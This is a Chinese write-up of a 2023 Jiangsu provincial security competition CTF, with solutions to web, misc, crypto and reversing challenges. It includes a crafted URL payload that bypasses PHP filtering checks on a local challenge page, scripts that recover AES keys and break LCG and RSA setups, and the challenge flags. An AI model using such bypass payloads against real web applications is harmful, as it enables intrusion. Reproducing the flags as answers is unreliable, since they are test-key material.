@@ -1,0 +1,324 @@
+# 2023年江苏省信息通信行业网络与信息安全职业技能竞赛决赛–WriteUp
+
+> 原文: https://www.ctfiot.com/147695.html
+> ID: 147695
+
+EDI
+
+JOIN US ▶▶▶
+
+招新
+
+EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。
+
+欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn 方向的师傅）有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。
+
+点击蓝字 ·  关注我们
+
+01
+
+Web
+
+1
+
+php trick
+
+<?php highlight_file(__FILE__); error_reporting(0); if(isset($_GET['path'])){ if(!(substr($_GET['path'], 32) === md5($_GET['path']))){ die('I passed the first level......'); }else{ if(preg_match('/^control$/', $_GET['con']) && $_GET['con'] !== 'control'){ $a=$_GET['flag']; $b=str_replace("data://", "", $a); $getflag = file_get_contents($b); }else die('Passed the second level......'); if(isset($getflag) && $getflag === 'ctfer'){ include 'flag.php'; echo $flag; }else die('The ctfer masters are amazing.....'); } } ?>
+
+http://127.0.0.1/web2.php?path[]=1&con=control%0a&flag=dadata://ta://text/plain;base64,Y3RmZXI=
+
+Flag：flag{HUgOMjhlVufsUQKP7f4tsYUeWfi9d09I}
+
+02
+
+Misc
+
+1
+
+careUSB（USB键盘流量）
+
+vim<SPACE>flag.txxt<RET>i<DOWN1><RET><UP1>flag[]<LEFT1>9f0adccbffb79191<DEL>ff0c2f091e49a5dd96<LEFT1><LEFT1><DEL>[unknown][unknown][unknown]<ESC>;;wq<RET>caat<SPACE>flag <RET>
+
+flag: flag{9f0adccbffb7919ff0c2f091e49a5d96}
+
+2
+
+PE（SlientEye隐写）
+
+Flag：flag{8a497aff3184d4b33000c44150760559}
+
+3
+
+数据安全1（base64补全，base隐写）
+
+题目描述：”某企业具备较高的网络安全素养，每年都会针对当年发生过的安全事件做相关的安全宣讲。正因为有了这样的安全防范意识，该企业在业务交流中传输的重要文件里都会添加数据水印，便于事件发生后的数据溯源。近日，该企业内部发生一起数据泄露事件，你能从截获到的数据中，提取出水印信息吗？
+
+提示：1：该企业参考base隐写。2：不妨去找找神奇的styles.xml呢？3：time为10位10进制数字串 请提交小写md5(download:xxx:time:xxx)，代码：hashlib.md5(flag.encode()).hexdigest()。”有效内容在
+
+然后再梭一把base64stego
+
+Flag: flag{db84ecac8eb2375777dcce20c4ba939e}
+
+4
+
+数据安全2（盲水印）
+
+题目描述：”某企业某程序员在日常运维检查时，发现有泄密人员在上传隐私信息，虽然定位了泄露的IP，但企业内网的IP地址是随机分配的，从而无法定位目标泄密者。但技能众多的程序员逐流进行分析，终于分析到关键地方，获取到了可能携带泄密者信息的图片。请参赛选手针对获取到图片进行分析，确定泄密者的身份信息。请以小写MD5（ID+phone）值的形式提交。请提交小写md5(ID+phone)，代码：hashlib.md5(flag.encode()).hexdigest()。”
+
+Flag：flag{3cef299383cd6c5d5cc90720d7fbcb61}
+
+03
+
+Crypto
+
+1
+
+Crypto1-AES（秘钥泄露）
+
+from Crypto.Util.number import *from Crypto.Cipher import AESfrom secret import key,flagimport os
+assert(len(flag)==38)assert(len(key)==16)
+def padding(msg): tmp = 16 - len(msg)%16 pad = hex(tmp)[2:].zfill(2) return bytes.fromhex(pad*tmp)+msg
+message = padding(flag)hint = bytes_to_long(key)^bytes_to_long(message[:16])
+iv = os.urandom(16)aes = AES.new(key,AES.MODE_CBC,iv=iv)enc = aes.encrypt(message)print(enc.hex())print(hex(hint))
+# output:# d136fd1a93ea993df7b5dd1d7a950a9ffeef2594e47d541b9964a57cf69f3837c0cdc90b7078a7c0974fa4167898351a# 0x3b3a3b3c4b6f793b38322a5d530b494a
+
+得到key的前15位：1016Aes128L12l2
+
+最后一位需要爆破
+
+from Crypto.Cipher import AESfrom gmpy2 import *from Crypto.Util.number import *
+ct = bytes.fromhex('d136fd1a93ea993df7b5dd1d7a950a9ffeef2594e47d541b9964a57cf69f3837c0cdc90b7078a7c0974fa4167898351a')kk = '1016Aes128L12l2'
+chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+
+ct = [ct[i:i+16] for i in range(0, len(ct), 16)]
+for i in chars: key = (kk + i).encode() print(key) for j in range(len(ct)-1,0,-1): c = AES.new(key, AES.MODE_ECB) ec = bytes_to_long(c.decrypt(ct[j])) ^ bytes_to_long(ct[j-1])        print(long_to_bytes(ec))
+
+Key：1016Aes128L12l2y
+
+得到后面的flag：73d7743fa45531b786b70e044ab768d}
+
+Flag： flag{373d7743fa45531b786b70e044ab768d}
+
+2
+
+Crypto2（LCG+RSA）
+
+from secret import flag1, flag2from gmpy2 import *from Crypto.Util.number import *
+m1 = bytes_to_long(flag1)m2 = bytes_to_long(flag2)
+def crypto1(): length = m1.bit_length() a = getPrime(length) b = getPrime(length) m = getPrime(length) seed = m1 output = [] for i in range(10): seed = (a * seed + b) % m output.append(seed) print('output =', output)
+def crypto2(): m2_list = [] p = getPrime(1024) q = getPrime(1024) n = p * q e = 65537 hint = powmod(2023 * q + 231103, p, n) c = [] for i in range(len(m2_list)): c.append(int(powmod(m2_list[i], e, n))) print('c =', c) print('hint =', hint) print('nn =', n)
+
+if __name__ == "__main__": crypto1() crypto2()
+
+# output = [834653491090491712633760412777668482940684660, 963076666352276362933538153002557560276280585, 2680203877874696332529229520897896728035506440, 91858763922260510630160081492878643315221800, 179788783853351298046757117828345043944048910, 360189746914947261716838580980986928642259725, 1736536856400074029770851415755580673843781308, 1808021479900001497137673789265033052269563590, 1346369077150300179482561724405766566952716635, 2373070631657135370182962105386676320122698203]# c = […]# hint = 9338337483016165146898805881521198487541269309312832770436948511851832795941266791467994915578419649411572460435260271128921674759992557197545048249434470787607127732811475208233811711545397847068095165612619003606564161170506468897933819532076007793540250883667417425343082043376105603896166033385911408654609024224333133291817708574091425998982236982208848625894644349373591225115610127472627985717732283759324902607157365503370214811285637714767888436301307605770837070222961915979595273212415836871397473400733701288540538544080768855638638602293660616424571436692781529212135754748657495513441649887066399815641# n = 26566298366382781281519125908424786963856550387674011415220761270178028565618620245185406648984634617854974445206610724734810892857339091633516947351741440994788700191189799988764343173914647096591779575666237861785163473720879395772744646178861521824163120894355954423163952598346158736490791956395261881103850207837298161904327244534821781661369671670803090335416464433768389172123558423828978582126115690776079581448080326998411708109024924484401975676011214124545502085738463524352787144445657656328837938664026202112240260840770445848444946039300979250933967179986200453997139662050410254918283621862756292376613
+
+两部分，LCG+RSA，LCG泄露超过6组了，就可以求出a,b,n，rsa就是费马小定理的推导。
+
+from gmpy2 import *from Crypto.Util.number import *
+def crack_unknown_increment(states, modulus, multiplier): increment = (states[1] - states[0]*multiplier) % modulus return modulus, multiplier, increment
+def crack_unknown_multiplier(states, modulus): multiplier = (states[2] - states[1]) * invert(states[1] - states[0], modulus) % modulus return crack_unknown_increment(states, modulus, multiplier)
+
+def crack_unknown_modulus(states): diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(gcd, zeroes)) return crack_unknown_multiplier(states, modulus)
+
+gift = [834653491090491712633760412777668482940684660, 963076666352276362933538153002557560276280585, 2680203877874696332529229520897896728035506440, 91858763922260510630160081492878643315221800, 179788783853351298046757117828345043944048910, 360189746914947261716838580980986928642259725, 1736536856400074029770851415755580673843781308, 1808021479900001497137673789265033052269563590, 1346369077150300179482561724405766566952716635, 2373070631657135370182962105386676320122698203]
+print crack_unknown_modulus(gift)
+n = 2819240979557316822841741422907191416843952899La = 1985688831373430536390227924404698949387527261Lb = 2078398662283321571387561823066952933053406543Ls1 = 834653491090491712633760412777668482940684660
+m = (s1 - b)*invert(a, n)%nprint long_to_bytes(m)
+
+Flag1: flag{1a1cba1971ba47
+
+第二步就是两边模q即可，最坑的是，分解出pq求解的明文数字没告知处理方式，全靠猜，赛后发现是把7组明文乘起来。。。
+
+Exp：
+
+from Crypto.Util.number import *from gmpy2 import *
+c = […]h = 9338337483016165146898805881521198487541269309312832770436948511851832795941266791467994915578419649411572460435260271128921674759992557197545048249434470787607127732811475208233811711545397847068095165612619003606564161170506468897933819532076007793540250883667417425343082043376105603896166033385911408654609024224333133291817708574091425998982236982208848625894644349373591225115610127472627985717732283759324902607157365503370214811285637714767888436301307605770837070222961915979595273212415836871397473400733701288540538544080768855638638602293660616424571436692781529212135754748657495513441649887066399815641n = 26566298366382781281519125908424786963856550387674011415220761270178028565618620245185406648984634617854974445206610724734810892857339091633516947351741440994788700191189799988764343173914647096591779575666237861785163473720879395772744646178861521824163120894355954423163952598346158736490791956395261881103850207837298161904327244534821781661369671670803090335416464433768389172123558423828978582126115690776079581448080326998411708109024924484401975676011214124545502085738463524352787144445657656328837938664026202112240260840770445848444946039300979250933967179986200453997139662050410254918283621862756292376613e = 65537
+p = gcd(int(h)-int(pow(231103,n,n)),n)print(p)print(isPrime(p))
+q = n // pprint(q)print(p*q == n)phi = (p - 1)*(q - 1)d = invert(e,phi)flag = 1for i in range(len(c)): flag *= pow(c[i],d,n)
+print(long_to_bytes(int(flag)))
+
+Flag: flag{1a1cba1971ba474fccbc7d9f7ca7c473}
+
+04
+
+Re
+
+1
+
+RE605（花指令605）
+
+主要判断逻辑
+
+该函数加花了，现场patch了几个jmp没有恢复代码，后来来不及做了，赛后动调。
+
+发现跟一下，对输入的数据两位相反，51-》15,52-》25，并且减32，以此类推，发现逻辑，
+
+先把对调前的密文恢复出来
+
+Exp：
+
+lst = [0x0F, 0xBA, 0x7D, 0x1D, 0xD7, 0x47, 0x38, 0x4A, 0x70, 0x0B, 0x5C, 0x79, 0x21, 0x6B, 0x56, 0x22, 0xF7, 0x50, 0x7D, 0x06, 0x1A, 0xE8, 0x57, 0x50, 0x3B, 0xE1, 0x04, 0x5C, 0x4B, 0x16, 0x02, 0x4A, 0x00, 0x40, 0x7B, 0x07, 0x68, 0xB6]key = 'green_mountains'
+flag = ''
+for i in range(len(lst)): flag += chr((lst[i]^(ord(key[i%len(key)]))))
+print flag.encode('hex')'''68c81878b91855250565281848052545853518684585382555956535256565386525155805d9'''def my_split(str, width): return [str[x:x + width] for x in range(0, len(str), width)]
+strr = '68c81878b91855250565281848052545853518684585382555956535256565386525155805d9'str = my_split(strr, 2)c = ''print(str)for i in str: c += i[::-1]c = c.decode('hex')
+flag = ''for i in range(len(c)): flag += chr(ord(c[i])-32)print flag
+
+Flag: flag{a5206bad02483af48c25963266c621e0}
+
+EDI安全
+
+扫二维码｜关注我们
+
+一个专注渗透实战经验分享的公众号
+
+
+```
+<?php highlight_file(__FILE__); error_reporting(0); if(isset($_GET['path'])){ if(!(substr($_GET['path'], 32) === md5($_GET['path']))){ die('I passed the first level......'); }else{ if(preg_match('/^control$/', $_GET['con']) && $_GET['con'] !== 'control'){ $a=$_GET['flag']; $b=str_replace("data://", "", $a); $getflag = file_get_contents($b); }else die('Passed the second level......'); if(isset($getflag) && $getflag === 'ctfer'){ include 'flag.php'; echo $flag; }else die('The ctfer masters are amazing.....'); } } ?>
+```
+
+
+
+```
+http://127.0.0.1/web2.php?path[]=1&con=control%0a&flag=dadata://ta://text/plain;base64,Y3RmZXI=
+```
+
+
+
+```
+Flag：flag{HUgOMjhlVufsUQKP7f4tsYUeWfi9d09I}
+```
+
+
+
+```
+vim<SPACE>flag.txxt<RET>i<DOWN1><RET><UP1>flag[]<LEFT1>9f0adccbffb79191<DEL>ff0c2f091e49a5dd96<LEFT1><LEFT1><DEL>[unknown][unknown][unknown]<ESC>;;wq<RET>caat<SPACE>flag <RET>
+```
+
+
+
+```
+flag: flag{9f0adccbffb7919ff0c2f091e49a5d96}
+```
+
+
+
+```
+Flag：flag{8a497aff3184d4b33000c44150760559}
+```
+
+
+
+```
+Flag: flag{db84ecac8eb2375777dcce20c4ba939e}
+```
+
+
+
+```
+Flag：flag{3cef299383cd6c5d5cc90720d7fbcb61}
+```
+
+
+
+```
+from Crypto.Util.number import *from Crypto.Cipher import AESfrom secret import key,flagimport os
+assert(len(flag)==38)assert(len(key)==16)
+def padding(msg): tmp = 16 - len(msg)%16 pad = hex(tmp)[2:].zfill(2) return bytes.fromhex(pad*tmp)+msg
+message = padding(flag)hint = bytes_to_long(key)^bytes_to_long(message[:16])
+iv = os.urandom(16)aes = AES.new(key,AES.MODE_CBC,iv=iv)enc = aes.encrypt(message)print(enc.hex())print(hex(hint))
+# output:# d136fd1a93ea993df7b5dd1d7a950a9ffeef2594e47d541b9964a57cf69f3837c0cdc90b7078a7c0974fa4167898351a# 0x3b3a3b3c4b6f793b38322a5d530b494a
+```
+
+
+
+```
+from Crypto.Cipher import AESfrom gmpy2 import *from Crypto.Util.number import *
+ct = bytes.fromhex('d136fd1a93ea993df7b5dd1d7a950a9ffeef2594e47d541b9964a57cf69f3837c0cdc90b7078a7c0974fa4167898351a')kk = '1016Aes128L12l2'
+chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+
+ct = [ct[i:i+16] for i in range(0, len(ct), 16)]
+for i in chars: key = (kk + i).encode() print(key) for j in range(len(ct)-1,0,-1): c = AES.new(key, AES.MODE_ECB) ec = bytes_to_long(c.decrypt(ct[j])) ^ bytes_to_long(ct[j-1])        print(long_to_bytes(ec))
+```
+
+
+
+```
+Flag： flag{373d7743fa45531b786b70e044ab768d}
+```
+
+
+
+```
+from secret import flag1, flag2from gmpy2 import *from Crypto.Util.number import *
+m1 = bytes_to_long(flag1)m2 = bytes_to_long(flag2)
+def crypto1(): length = m1.bit_length() a = getPrime(length) b = getPrime(length) m = getPrime(length) seed = m1 output = [] for i in range(10): seed = (a * seed + b) % m output.append(seed) print('output =', output)
+def crypto2(): m2_list = [] p = getPrime(1024) q = getPrime(1024) n = p * q e = 65537 hint = powmod(2023 * q + 231103, p, n) c = [] for i in range(len(m2_list)): c.append(int(powmod(m2_list[i], e, n))) print('c =', c) print('hint =', hint) print('nn =', n)
+
+if __name__ == "__main__": crypto1() crypto2()
+
+# output = [834653491090491712633760412777668482940684660, 963076666352276362933538153002557560276280585, 2680203877874696332529229520897896728035506440, 91858763922260510630160081492878643315221800, 179788783853351298046757117828345043944048910, 360189746914947261716838580980986928642259725, 1736536856400074029770851415755580673843781308, 1808021479900001497137673789265033052269563590, 1346369077150300179482561724405766566952716635, 2373070631657135370182962105386676320122698203]# c = […]# hint = 9338337483016165146898805881521198487541269309312832770436948511851832795941266791467994915578419649411572460435260271128921674759992557197545048249434470787607127732811475208233811711545397847068095165612619003606564161170506468897933819532076007793540250883667417425343082043376105603896166033385911408654609024224333133291817708574091425998982236982208848625894644349373591225115610127472627985717732283759324902607157365503370214811285637714767888436301307605770837070222961915979595273212415836871397473400733701288540538544080768855638638602293660616424571436692781529212135754748657495513441649887066399815641# n = 26566298366382781281519125908424786963856550387674011415220761270178028565618620245185406648984634617854974445206610724734810892857339091633516947351741440994788700191189799988764343173914647096591779575666237861785163473720879395772744646178861521824163120894355954423163952598346158736490791956395261881103850207837298161904327244534821781661369671670803090335416464433768389172123558423828978582126115690776079581448080326998411708109024924484401975676011214124545502085738463524352787144445657656328837938664026202112240260840770445848444946039300979250933967179986200453997139662050410254918283621862756292376613
+```
+
+
+
+```
+from gmpy2 import *from Crypto.Util.number import *
+def crack_unknown_increment(states, modulus, multiplier): increment = (states[1] - states[0]*multiplier) % modulus return modulus, multiplier, increment
+def crack_unknown_multiplier(states, modulus): multiplier = (states[2] - states[1]) * invert(states[1] - states[0], modulus) % modulus return crack_unknown_increment(states, modulus, multiplier)
+
+def crack_unknown_modulus(states): diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(gcd, zeroes)) return crack_unknown_multiplier(states, modulus)
+
+gift = [834653491090491712633760412777668482940684660, 963076666352276362933538153002557560276280585, 2680203877874696332529229520897896728035506440, 91858763922260510630160081492878643315221800, 179788783853351298046757117828345043944048910, 360189746914947261716838580980986928642259725, 1736536856400074029770851415755580673843781308, 1808021479900001497137673789265033052269563590, 1346369077150300179482561724405766566952716635, 2373070631657135370182962105386676320122698203]
+print crack_unknown_modulus(gift)
+n = 2819240979557316822841741422907191416843952899La = 1985688831373430536390227924404698949387527261Lb = 2078398662283321571387561823066952933053406543Ls1 = 834653491090491712633760412777668482940684660
+m = (s1 - b)*invert(a, n)%nprint long_to_bytes(m)
+```
+
+
+
+```
+from Crypto.Util.number import *from gmpy2 import *
+c = […]h = 9338337483016165146898805881521198487541269309312832770436948511851832795941266791467994915578419649411572460435260271128921674759992557197545048249434470787607127732811475208233811711545397847068095165612619003606564161170506468897933819532076007793540250883667417425343082043376105603896166033385911408654609024224333133291817708574091425998982236982208848625894644349373591225115610127472627985717732283759324902607157365503370214811285637714767888436301307605770837070222961915979595273212415836871397473400733701288540538544080768855638638602293660616424571436692781529212135754748657495513441649887066399815641n = 26566298366382781281519125908424786963856550387674011415220761270178028565618620245185406648984634617854974445206610724734810892857339091633516947351741440994788700191189799988764343173914647096591779575666237861785163473720879395772744646178861521824163120894355954423163952598346158736490791956395261881103850207837298161904327244534821781661369671670803090335416464433768389172123558423828978582126115690776079581448080326998411708109024924484401975676011214124545502085738463524352787144445657656328837938664026202112240260840770445848444946039300979250933967179986200453997139662050410254918283621862756292376613e = 65537
+p = gcd(int(h)-int(pow(231103,n,n)),n)print(p)print(isPrime(p))
+q = n // pprint(q)print(p*q == n)phi = (p - 1)*(q - 1)d = invert(e,phi)flag = 1for i in range(len(c)): flag *= pow(c[i],d,n)
+print(long_to_bytes(int(flag)))
+```
+
+
+
+```
+Flag: flag{1a1cba1971ba474fccbc7d9f7ca7c473}
+```
+
+
+
+```
+lst = [0x0F, 0xBA, 0x7D, 0x1D, 0xD7, 0x47, 0x38, 0x4A, 0x70, 0x0B, 0x5C, 0x79, 0x21, 0x6B, 0x56, 0x22, 0xF7, 0x50, 0x7D, 0x06, 0x1A, 0xE8, 0x57, 0x50, 0x3B, 0xE1, 0x04, 0x5C, 0x4B, 0x16, 0x02, 0x4A, 0x00, 0x40, 0x7B, 0x07, 0x68, 0xB6]key = 'green_mountains'
+flag = ''
+for i in range(len(lst)): flag += chr((lst[i]^(ord(key[i%len(key)]))))
+print flag.encode('hex')'''68c81878b91855250565281848052545853518684585382555956535256565386525155805d9'''def my_split(str, width): return [str[x:x + width] for x in range(0, len(str), width)]
+strr = '68c81878b91855250565281848052545853518684585382555956535256565386525155805d9'str = my_split(strr, 2)c = ''print(str)for i in str: c += i[::-1]c = c.decode('hex')
+flag = ''for i in range(len(c)): flag += chr(ord(c[i])-32)print flag
+```
+
+
+
+```
+Flag: flag{a5206bad02483af48c25963266c621e0}
+```
+
+
+---
+## 附图
+
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/4-1701142944.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/6-1701142945.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/2-1701142945.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/7-1701142946.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/7-1701142947.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/2-1701142947.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/2-1701142948.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/1-1701142948.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/10-1701142950.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/4-1701142950.png)
